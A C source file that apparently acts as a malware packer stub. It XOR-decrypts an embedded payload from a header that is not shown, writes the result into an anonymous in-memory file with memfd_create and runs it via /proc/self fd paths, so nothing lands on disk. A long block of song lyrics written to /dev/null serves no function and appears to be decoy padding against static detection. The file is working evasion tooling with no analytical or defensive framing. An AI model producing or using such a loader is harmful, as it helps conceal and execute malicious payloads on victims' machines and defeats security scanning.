#define _GNU_SOURCE 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "code.h"

void elf_loader(uint8_t *prog, size_t size)
{
    int fd = memfd_create("", 1);
    write(fd, prog, size);

    char path[1024] = {0};
    char *arr[] = {"", NULL};
    sprintf(path, "/proc/%d/fd/%d", getpid(), fd);

    execv(path, arr);
}

int main(void)
{
    char const *lyrics = "Black then white are all I see in my infancy\n"
                        "Red and yellow then came to be, reaching out to me\n"
                        "Lets me see\n"
                        "As below, so above and beyond, I imagine\n"
                        "Drawn beyond the lines of reason\n"
                        "Push the envelope, watch it bend\n"
                        "Over thinking, over analyzing separates the body from the mind\n"
                        "Withering my intuition, missing opportunities and I must\n"
                        "Feed my will to feel my moment drawing way outside the lines\n"
                        "Black then white are all I see in my infancy\n"
                        "Red and yellow then came to be, reaching out to me\n"
                        "Lets me see\n"
                        "There is so much more\n"
                        "And beckons me to look through to these infinite possibilities\n"
                        "As below, so above and beyond, I imagine\n"
                        "Drawn outside the lines of reason\n"
                        "Push the envelope, watch it bend\n"
                        "Over thinking, over analyzing separates the body from the mind\n"
                        "Withering my intuition leaving opportunities behind\n"
                        "Feed my will to feel this moment\n"
                        "Urging me to cross the line\n"
                        "Reaching out to embrace the random\n"
                        "Reaching out to embrace whatever may come\n"
                        "I embrace my desire to\n"
                        "I embrace my desire to\n"
                        "Feel the rhythm, to feel connected\n"
                        "Enough to step aside and weep like a widow\n"
                        "To feel inspired\n"
                        "To fathom the power\n"
                        "To witness the beauty\n"
                        "To bathe in the fountain\n"
                        "To swing on the spiral\n"
                        "To swing on the spiral to\n"
                        "Swing on the spiral\n"
                        "Of our divinity\n"
                        "And still be a human\n"
                        "With my feet upon the ground I lose myself\n"
                        "Between the sounds and open wide to suck it in\n"
                        "I feel it move across my skin\n"
                        "I'm reaching up and reaching out\n"
                        "I'm reaching for the random or what ever will bewilder me\n"
                        "What ever will bewilder me\n"
                        "And following our will and wind we may just go where no one's been\n"
                        "We'll ride the spiral to the end and may just go where no one's been\n"
                        "Spiral out, keep going\n"
                        "Spiral out, keep going\n"
                        "Spiral out, keep going\n"
                        "Spiral out, keep going\n";

    FILE *fp = fopen("/dev/null", "w");
    fputs(lyrics, fp);
    fclose(fp);

    uint8_t *tool = (uint8_t *) malloc(STOP);
    uint8_t *prog = (uint8_t *) malloc(LENGTH - STOP);

    memcpy(tool, opcode, STOP);

    for (size_t i = STOP; i < LENGTH; i++)
    {
        prog[i - STOP] = opcode[i] ^ tool[i - STOP];
    }

    elf_loader(prog, LENGTH - STOP);

    free(tool);
    free(prog);
    return 0;
}